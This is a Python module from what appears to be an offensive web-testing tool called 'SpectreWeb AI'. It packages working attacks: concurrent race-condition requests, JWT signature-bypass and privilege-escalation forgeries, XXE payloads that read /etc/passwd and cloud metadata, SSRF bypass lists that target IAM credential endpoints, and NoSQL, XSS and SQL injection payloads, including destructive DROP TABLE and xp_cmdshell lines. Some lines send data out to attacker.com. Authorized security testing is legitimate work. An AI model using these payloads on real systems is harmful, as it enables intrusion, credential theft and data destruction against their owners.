#!/usr/bin/env python3
"""
SpectreWeb AI - Advanced Attack Techniques v1.0

High-level exploitation techniques for advanced bug bounty hunting.
Includes: Race Conditions, GraphQL, XXE, Blind SSRF, JWT Attacks, and more.
"""

import re
import json
import base64
import hashlib
import time
import concurrent.futures
from typing import Dict, Any, List, Optional, Tuple
from urllib.parse import urlparse, urljoin, quote, parse_qs
from datetime import datetime, timedelta
import hmac

try:
    from .client import make_request
except ImportError:
    from web.client import make_request


def _b64_decode_jwt_part(part: str) -> dict:
    """Decode a JWT part with proper base64 padding."""
    padding = -len(part) % 4
    part += "=" * padding
    return json.loads(base64.urlsafe_b64decode(part).decode())


# ============================================================================
# RACE CONDITION TESTING
# ============================================================================

def test_race_condition(
    url: str, 
    method: str = "POST",
    data: dict = None,
    headers: dict = None,
    concurrent_requests: int = 20,
    delay_between_batches: float = 0
) -> Dict[str, Any]:
    """
    Test for race condition vulnerabilities.
    
    Common targets:
    - Coupon/discount redemption
    - Follow/like/vote systems
    - Money transfer/withdrawal
    - Inventory/stock purchase
    - One-time token usage
    
    Returns: Results showing any discrepancies in responses
    """
    print(f"[PROGRESS] Race Condition: Starting {concurrent_requests} concurrent requests...")
    start_time = time.time()
    
    results = []
    successful = 0
    failed = 0
    
    def make_single_request(request_id: int) -> Dict:
        try:
            resp = make_request(url, method=method, headers=headers, data=json.dumps(data) if data else None, timeout=60)
            return {
                "id": request_id,
                "status": resp.get("status_code", 0),
                "success": resp.get("success", False),
                "body_length": resp.get("body_length", 0),
                "elapsed": resp.get("elapsed", 0),
                "body_preview": resp.get("body", "")[:200]
            }
        except Exception as e:
            return {"id": request_id, "error": str(e), "success": False}
    
    # Execute concurrent requests
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent_requests) as executor:
        futures = [executor.submit(make_single_request, i) for i in range(concurrent_requests)]
        
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            results.append(result)
            if result.get("success"):
                successful += 1
            else:
                failed += 1
    
    # Analyze results for race condition indicators
    elapsed = time.time() - start_time
    status_codes = [r.get("status") for r in results if r.get("status")]
    unique_statuses = set(status_codes)
    body_lengths = [r.get("body_length") for r in results if r.get("body_length")]
    
    # Detect anomalies
    anomalies = []
    if len(unique_statuses) > 1:
        anomalies.append(f"Multiple status codes detected: {unique_statuses}")
    if body_lengths and max(body_lengths) - min(body_lengths) > 100:
        anomalies.append(f"Response length variance: {min(body_lengths)} - {max(body_lengths)}")
    
    # Count different responses
    response_fingerprints = {}
    for r in results:
        fp = f"{r.get('status')}_{r.get('body_length')}"
        response_fingerprints[fp] = response_fingerprints.get(fp, 0) + 1
    
    print(f"[PROGRESS] Race Condition: Completed in {elapsed:.2f}s")
    
    return {
        "success": True,
        "url": url,
        "concurrent_requests": concurrent_requests,
        "successful": successful,
        "failed": failed,
        "elapsed": f"{elapsed:.2f}s",
        "unique_status_codes": list(unique_statuses),
        "response_fingerprints": response_fingerprints,
        "anomalies": anomalies,
        "potentially_vulnerable": len(anomalies) > 0 or len(unique_statuses) > 1,
        "results": results[:10]  # First 10 results
    }


# ============================================================================
# GRAPHQL ATTACKS
# ============================================================================

GRAPHQL_INTROSPECTION = '''
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        args { name type { name kind } }
        type { name kind }
      }
    }
  }
}
'''

GRAPHQL_ATTACKS = {
    "introspection": GRAPHQL_INTROSPECTION,
    "dos_nested": '''
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends { name }
          }
        }
      }
    }
  }
}
''',
    "batching": [
        {"query": "query { user(id: 1) { name } }"},
        {"query": "query { user(id: 2) { name } }"},
        {"query": "query { user(id: 3) { name } }"},
    ],
    "alias_dos": '''
query {
  a1: user(id: 1) { name }
  a2: user(id: 2) { name }
  a3: user(id: 3) { name }
  a4: user(id: 4) { name }
  a5: user(id: 5) { name }
}
''',
    "directive_overload": '''
query {
  user(id: 1) @include(if: true) @skip(if: false) @deprecated {
    name
  }
}
'''
}

def test_graphql_endpoint(url: str, headers: dict = None) -> Dict[str, Any]:
    """
    Test GraphQL endpoint for common vulnerabilities.
    
    Tests:
    - Introspection enabled
    - Batching attacks
    - Nested query DoS
    - Field suggestions
    """
    print(f"[PROGRESS] GraphQL: Testing {url}...")
    results = {"url": url, "findings": [], "introspection": None}
    
    default_headers = {"Content-Type": "application/json"}
    if headers:
        default_headers.update(headers)
    
    # Test introspection
    print("[PROGRESS] GraphQL: Testing introspection...")
    intro_resp = make_request(
        url, 
        method="POST", 
        headers=default_headers,
        data=json.dumps({"query": GRAPHQL_INTROSPECTION}),
        timeout=60
    )
    
    if intro_resp.get("success") and "__schema" in intro_resp.get("body", ""):
        results["introspection"] = True
        results["findings"].append({
            "type": "introspection_enabled",
            "severity": "medium",
            "description": "GraphQL introspection is enabled - full schema exposed"
        })
        
        # Parse types from response
        try:
            body = json.loads(intro_resp.get("body", "{}"))
            types = body.get("data", {}).get("__schema", {}).get("types", [])
            user_types = [t for t in types if t.get("kind") == "OBJECT" and not t.get("name", "").startswith("__")]
            results["schema_types"] = [t.get("name") for t in user_types[:20]]
        except (KeyError, TypeError, ValueError):
            pass
    else:
        results["introspection"] = False
    
    # Test for field suggestions
    print("[PROGRESS] GraphQL: Testing field suggestions...")
    suggestion_query = '{"query": "{ user { nonexistentfield } }"}'
    sugg_resp = make_request(url, method="POST", headers=default_headers, data=suggestion_query, timeout=60)
    if "did you mean" in sugg_resp.get("body", "").lower():
        results["findings"].append({
            "type": "field_suggestions",
            "severity": "low",
            "description": "GraphQL provides field suggestions - aids enumeration"
        })
    
    # Test batching
    print("[PROGRESS] GraphQL: Testing batching...")
    batch_resp = make_request(
        url,
        method="POST",
        headers=default_headers,
        data=json.dumps(GRAPHQL_ATTACKS["batching"]),
        timeout=30
    )
    if batch_resp.get("success") and batch_resp.get("status_code") == 200:
        results["findings"].append({
            "type": "batching_enabled",
            "severity": "low",
            "description": "GraphQL batching is enabled - potential DoS vector"
        })
    
    results["success"] = True
    results["total_findings"] = len(results["findings"])
    
    print(f"[PROGRESS] GraphQL: Found {len(results['findings'])} issues")
    return results


# ============================================================================
# XXE ATTACKS
# ============================================================================

XXE_PAYLOADS = {
    "basic": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',

    "parameter_entity": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>''',

    "blind_oob": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{callback}/xxe">
  %xxe;
]>
<root>test</root>''',

    "ssrf": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>''',

    "billion_laughs": '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>''',

    "utf7": '''<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-
  +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-''',
}

def generate_xxe_payloads(callback_url: str = "") -> Dict[str, Any]:
    """
    Generate XXE payloads for testing.
    
    Args:
        callback_url: URL for OOB (out-of-band) callbacks
    """
    payloads = dict(XXE_PAYLOADS)
    
    if callback_url:
        payloads["blind_oob"] = payloads["blind_oob"].format(callback=callback_url)
        payloads["blind_ftp"] = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://{callback_url}/evil.dtd">
  %dtd;
]>
<root>test</root>'''
    
    return {
        "success": True,
        "payloads": payloads,
        "content_types": [
            "application/xml",
            "text/xml",
            "application/x-www-form-urlencoded",  # Some parsers accept XML here
            "application/json",  # Some convert JSON to XML internally
        ],
        "tips": [
            "Try changing Content-Type to application/xml",
            "Look for XML processing in file uploads (SVG, DOCX, XLSX)",
            "Check SOAP endpoints for XXE",
            "Try parameter entities for blind XXE"
        ]
    }


# ============================================================================
# JWT ADVANCED ATTACKS
# ============================================================================

def jwt_none_attack(token: str) -> Dict[str, Any]:
    """
    Generate JWT with 'none' algorithm to bypass signature verification.
    """
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return {"success": False, "error": "Invalid JWT format"}
        
        # Decode header (using proper padding)
        header = _b64_decode_jwt_part(parts[0])
        payload = _b64_decode_jwt_part(parts[1])
        
        # Create none algorithm variants
        none_variants = []
        for alg in ["none", "None", "NONE", "nOnE"]:
            new_header = dict(header)
            new_header["alg"] = alg
            
            h = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip("=")
            p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
            
            none_variants.append({
                "algorithm": alg,
                "token": f"{h}.{p}.",
                "token_with_empty_sig": f"{h}.{p}.e30"
            })
        
        return {
            "success": True,
            "original_algorithm": header.get("alg"),
            "payload": payload,
            "none_variants": none_variants
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def jwt_key_confusion(token: str, public_key: str = "") -> Dict[str, Any]:
    """
    Generate JWTs for algorithm confusion attack (RS256 -> HS256).
    
    If server uses RS256 and doesn't check algorithm,
    we can sign with the public key using HS256.
    """
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return {"success": False, "error": "Invalid JWT format"}
        
        header = _b64_decode_jwt_part(parts[0])
        payload = _b64_decode_jwt_part(parts[1])
        
        if header.get("alg") not in ["RS256", "RS384", "RS512"]:
            return {"success": False, "error": "Token doesn't use RSA algorithm"}
        
        # Generate HS256 variant
        new_header = {"alg": "HS256", "typ": "JWT"}
        h = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip("=")
        p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        
        result = {
            "success": True,
            "original_algorithm": header.get("alg"),
            "attack": "algorithm_confusion",
            "description": "Change RS256 to HS256 and sign with public key",
            "payload": payload,
            "unsigned_token": f"{h}.{p}."
        }
        
        if public_key:
            # Sign with public key as HMAC secret
            message = f"{h}.{p}".encode()
            signature = base64.urlsafe_b64encode(
                hmac.new(public_key.encode(), message, hashlib.sha256).digest()
            ).decode().rstrip("=")
            result["signed_token"] = f"{h}.{p}.{signature}"
        
        return result
    except Exception as e:
        return {"success": False, "error": str(e)}


def jwt_claim_injection(token: str, claims: dict = None) -> Dict[str, Any]:
    """
    Inject or modify JWT claims for privilege escalation.
    """
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return {"success": False, "error": "Invalid JWT format"}
        
        header = _b64_decode_jwt_part(parts[0])
        payload = _b64_decode_jwt_part(parts[1])
        
        # Default escalation claims
        default_claims = {
            "admin": True,
            "role": "admin",
            "is_admin": True,
            "user_id": 1,
            "permissions": ["*"],
            "groups": ["admin", "root"],
        }
        
        claims = claims or default_claims
        
        # Generate variants with different claim injections
        variants = []
        for claim, value in claims.items():
            modified_payload = dict(payload)
            modified_payload[claim] = value
            
            h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
            p = base64.urlsafe_b64encode(json.dumps(modified_payload).encode()).decode().rstrip("=")
            
            variants.append({
                "claim": claim,
                "value": value,
                "token": f"{h}.{p}.",
                "description": f"Added/modified '{claim}' claim"
            })
        
        return {
            "success": True,
            "original_payload": payload,
            "variants": variants
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


# ============================================================================
# BLIND SSRF DETECTION
# ============================================================================

SSRF_BYPASS_PAYLOADS = [
    # IP formats
    "http://127.0.0.1",
    "http://127.1",
    "http://0.0.0.0",
    "http://0",
    "http://2130706433",  # Decimal 127.0.0.1
    "http://0x7f000001",  # Hex 127.0.0.1
    "http://0177.0.0.1",  # Octal
    "http://[::1]",
    "http://[0:0:0:0:0:0:0:1]",
    "http://[::ffff:127.0.0.1]",
    
    # DNS rebinding
    "http://localtest.me",
    "http://127.0.0.1.nip.io",
    "http://spoofed.burpcollaborator.net",
    
    # Cloud metadata
    "http://169.254.169.254",
    "http://metadata.google.internal",
    "http://169.254.170.2",  # ECS metadata
    
    # URL parsing confusion
    "http://evil.com#@127.0.0.1",
    "http://evil.com?@127.0.0.1",
    "http://127.0.0.1:80@evil.com",
    "http://127.0.0.1%00.evil.com",
    "http://127.0.0.1%0d%0a.evil.com",
    
    # Protocol smuggling
    "http://127.0.0.1:11211/",  # Memcached
    "http://127.0.0.1:6379/",  # Redis
    "http://127.0.0.1:9200/",  # Elasticsearch
    
    # Redirect-based
    "http://httpbin.org/redirect-to?url=http://127.0.0.1",
]

CLOUD_METADATA_ENDPOINTS = {
    "aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token",
    ],
    "digitalocean": [
        "http://169.254.169.254/metadata/v1/",
    ],
}

def generate_ssrf_payloads(target_ip: str = "127.0.0.1", callback_url: str = "") -> Dict[str, Any]:
    """
    Generate comprehensive SSRF bypass payloads.
    """
    payloads = list(SSRF_BYPASS_PAYLOADS)
    
    if callback_url:
        payloads.extend([
            f"http://{callback_url}/ssrf",
            f"http://{callback_url}/?url=http://127.0.0.1",
        ])
    
    # Add target-specific payloads
    if target_ip != "127.0.0.1":
        payloads.extend([
            f"http://{target_ip}",
            f"http://{target_ip}:80",
            f"http://{target_ip}:443",
            f"http://{target_ip}:8080",
        ])
    
    return {
        "success": True,
        "bypass_payloads": payloads,
        "cloud_metadata": CLOUD_METADATA_ENDPOINTS,
        "tips": [
            "Try URL encoding special characters",
            "Use DNS rebinding for filter bypass",
            "Check for redirect-based SSRF",
            "Try different protocols (gopher://, file://, dict://)",
            "Use IPv6 addresses for filter bypass"
        ]
    }


# ============================================================================
# DOM XSS SOURCES AND SINKS
# ============================================================================

DOM_XSS_SOURCES = [
    "location.href",
    "location.search",
    "location.hash",
    "location.pathname",
    "document.URL",
    "document.documentURI",
    "document.referrer",
    "window.name",
    "document.cookie",
    "localStorage",
    "sessionStorage",
    "IndexedDB",
    "WebSocket.url",
    "postMessage",
]

DOM_XSS_SINKS = [
    "eval(",
    "Function(",
    "setTimeout(",
    "setInterval(",
    "setImmediate(",
    "execScript(",
    ".innerHTML",
    ".outerHTML",
    ".insertAdjacentHTML",
    "document.write(",
    "document.writeln(",
    ".src",
    ".href",
    ".action",
    ".data",
    "$.html(",
    "$()",
    "jQuery(",
    "angular.element(",
    "v-html",
    ":href",
    "dangerouslySetInnerHTML",
]

def analyze_dom_xss(js_content: str) -> Dict[str, Any]:
    """
    Analyze JavaScript code for potential DOM XSS vulnerabilities.
    
    Identifies dangerous source-to-sink data flows.
    """
    findings = []
    
    # Check for sources
    sources_found = []
    for source in DOM_XSS_SOURCES:
        if source in js_content:
            sources_found.append(source)
    
    # Check for sinks
    sinks_found = []
    for sink in DOM_XSS_SINKS:
        if sink in js_content:
            sinks_found.append(sink)
    
    # Find potential vulnerable patterns
    dangerous_patterns = [
        (r'\.innerHTML\s*=.*location', "location to innerHTML"),
        (r'eval\(.*location', "location to eval"),
        (r'document\.write\(.*location', "location to document.write"),
        (r'\$\([^\)]+\)\.html\(.*location', "location to jQuery.html"),
        (r'\.innerHTML\s*=.*document\.URL', "document.URL to innerHTML"),
        (r'\.innerHTML\s*=.*document\.referrer', "document.referrer to innerHTML"),
        (r'\.src\s*=.*location', "location to src"),
        (r'eval\(.*window\.name', "window.name to eval"),
    ]
    
    for pattern, desc in dangerous_patterns:
        if re.search(pattern, js_content, re.IGNORECASE):
            findings.append({
                "pattern": pattern,
                "description": desc,
                "severity": "high",
                "type": "dom_xss"
            })
    
    # Calculate risk
    if sources_found and sinks_found:
        risk = "HIGH" if findings else "MEDIUM"
    elif sources_found or sinks_found:
        risk = "LOW"
    else:
        risk = "NONE"
    
    return {
        "success": True,
        "sources": sources_found,
        "sinks": sinks_found,
        "findings": findings,
        "risk": risk,
        "recommendations": [
            "Use textContent instead of innerHTML",
            "Sanitize user input before DOM insertion",
            "Avoid eval() and similar dynamic code execution",
            "Use Content-Security-Policy to mitigate impact"
        ] if risk != "NONE" else []
    }


# ============================================================================
# NOSQL INJECTION
# ============================================================================

NOSQL_PAYLOADS = {
    "mongodb": [
        '{"$ne": null}',
        '{"$ne": ""}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        '{"$or": [{"a": 1}, {"b": 2}]}',
        '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
        "[$ne]=1",
        "username[$ne]=&password[$ne]=",
        '{"$regex": "^a"}',
    ],
    "couchdb": [
        '{"_id": {"$gt": ""}}',
        '{"selector": {"_id": {"$gt": null}}}',
    ],
    "blind": [
        '{"$where": "sleep(5000)"}',
        '{"$where": "this.username.match(/^a/)"}',
        '{"username": {"$regex": "^a.*"}}',
    ]
}

def generate_nosql_payloads(param: str = "username") -> Dict[str, Any]:
    """
    Generate NoSQL injection payloads for testing.
    """
    payloads = []
    
    # JSON-based
    for payload in NOSQL_PAYLOADS["mongodb"]:
        payloads.append({
            "type": "json",
            "payload": payload,
            "param": param
        })
    
    # URL-encoded array injection
    payloads.extend([
        {"type": "url", "payload": f"{param}[$ne]=", "description": "MongoDB $ne operator"},
        {"type": "url", "payload": f"{param}[$gt]=", "description": "MongoDB $gt operator"},
        {"type": "url", "payload": f"{param}[$regex]=.*", "description": "MongoDB regex"},
        {"type": "url", "payload": f"{param}[$exists]=true", "description": "MongoDB $exists"},
    ])
    
    return {
        "success": True,
        "payloads": payloads,
        "blind_payloads": NOSQL_PAYLOADS["blind"],
        "detection_tips": [
            "Look for JSON parsing in request body",
            "Check if arrays are accepted in parameters",
            "Test boolean-based blind injection with $where",
            "Try time-based blind with sleep functions"
        ]
    }


# ============================================================================
# ADVANCED XSS PAYLOADS
# ============================================================================

ADVANCED_XSS = {
    "polyglot": [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "'-alert(1)-'",
        "\"><img src=x onerror=alert(1)>",
        "{{constructor.constructor('alert(1)')()}}",
    ],
    "filter_bypass": [
        "<svg/onload=alert(1)>",
        "<svg onload=alert`1`>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    ],
    "encoding_bypass": [
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
    ],
    "waf_bypass": [
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<sCrIpT>alert(1)</sCrIpT>",
        "<script>alert(1)</script >",
        "<script>alert(1)</script\t>",
        "<script>alert(1)</script\n>",
        "<<script>script>alert(1)<</script>/script>",
    ],
    "csp_bypass": [
        "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js'></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
        "<base href='https://evil.com/'>",
        "<script nonce='random123'>alert(1)</script>",
    ],
    "mutation": [
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<a href=\"javascript&colon;alert(1)\">click</a>",
        "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>",
    ]
}

def generate_xss_payloads(context: str = "html") -> Dict[str, Any]:
    """
    Generate context-aware XSS payloads.
    
    Args:
        context: 'html', 'attribute', 'javascript', 'url', 'css'
    """
    payloads = []
    
    if context == "html":
        payloads = ADVANCED_XSS["polyglot"] + ADVANCED_XSS["filter_bypass"]
    elif context == "attribute":
        payloads = [
            "\" onmouseover=alert(1) x=\"",
            "' onmouseover=alert(1) x='",
            "\" onfocus=alert(1) autofocus x=\"",
            "javascript:alert(1)",
        ]
    elif context == "javascript":
        payloads = [
            "'-alert(1)-'",
            "\\'-alert(1)//",
            "</script><script>alert(1)</script>",
            "1;alert(1)//",
        ]
    elif context == "url":
        payloads = [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox(1)",
        ]
    elif context == "css":
        payloads = [
            "expression(alert(1))",
            "url(javascript:alert(1))",
        ]
    
    # Add WAF bypass variants
    payloads.extend(ADVANCED_XSS["waf_bypass"][:3])
    
    return {
        "success": True,
        "context": context,
        "payloads": payloads,
        "polyglot": ADVANCED_XSS["polyglot"][0],
        "all_categories": list(ADVANCED_XSS.keys())
    }


# ============================================================================
# ADVANCED SQLI PAYLOADS
# ============================================================================

ADVANCED_SQLI = {
    "error_based": [
        "' AND extractvalue(1,concat(0x7e,(SELECT version()))) --",
        "' AND updatexml(1,concat(0x7e,(SELECT user())),1) --",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
    ],
    "union": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION ALL SELECT NULL,NULL,CONCAT(user,':',password) FROM users--",
    ],
    "blind_boolean": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
        "' AND (SELECT LENGTH(password) FROM users LIMIT 1)>5--",
    ],
    "blind_time": [
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    ],
    "stacked": [
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('pwned','pwned')--",
        "'; UPDATE users SET password='pwned' WHERE username='admin'--",
    ],
    "filter_bypass": [
        "/*!50000SELECT*/ * FROM users",
        "SELECT/**/ * FROM/**/users",
        "UNION%0ASELECT%0A1,2,3",
        "UNION%09SELECT%091,2,3",
        "UnIoN SeLeCt 1,2,3",
    ],
    "out_of_band": [
        "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",
        "' UNION SELECT load_file('\\\\\\\\attacker.com\\\\share\\\\')--",
    ]
}

def generate_sqli_payloads(db_type: str = "mysql") -> Dict[str, Any]:
    """
    Generate database-specific SQL injection payloads.
    
    Args:
        db_type: 'mysql', 'mssql', 'postgresql', 'oracle', 'sqlite'
    """
    all_payloads = []
    
    # Add common payloads
    for category, payloads in ADVANCED_SQLI.items():
        for p in payloads:
            all_payloads.append({
                "category": category,
                "payload": p
            })
    
    # Database-specific payloads
    db_specific = {
        "mysql": [
            "' AND BENCHMARK(10000000,SHA1('test'))--",
            "' UNION SELECT LOAD_FILE('/etc/passwd')--",
        ],
        "mssql": [
            "'; EXEC xp_cmdshell 'whoami'--",
            "'; EXEC sp_configure 'show advanced options', 1--",
        ],
        "postgresql": [
            "'; SELECT pg_ls_dir('/')--",
            "' UNION SELECT null,null,STRING_AGG(table_name,',') FROM information_schema.tables--",
        ],
        "oracle": [
            "' UNION SELECT NULL,UTL_HTTP.REQUEST('http://attacker.com/'||USER) FROM DUAL--",
            "' UNION SELECT NULL,banner FROM v$version WHERE ROWNUM=1--",
        ],
        "sqlite": [
            "' UNION SELECT sql FROM sqlite_master--",
            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
        ]
    }
    
    if db_type in db_specific:
        for p in db_specific[db_type]:
            all_payloads.append({
                "category": f"{db_type}_specific",
                "payload": p
            })
    
    return {
        "success": True,
        "db_type": db_type,
        "payloads": all_payloads,
        "total": len(all_payloads),
        "categories": list(ADVANCED_SQLI.keys())
    }
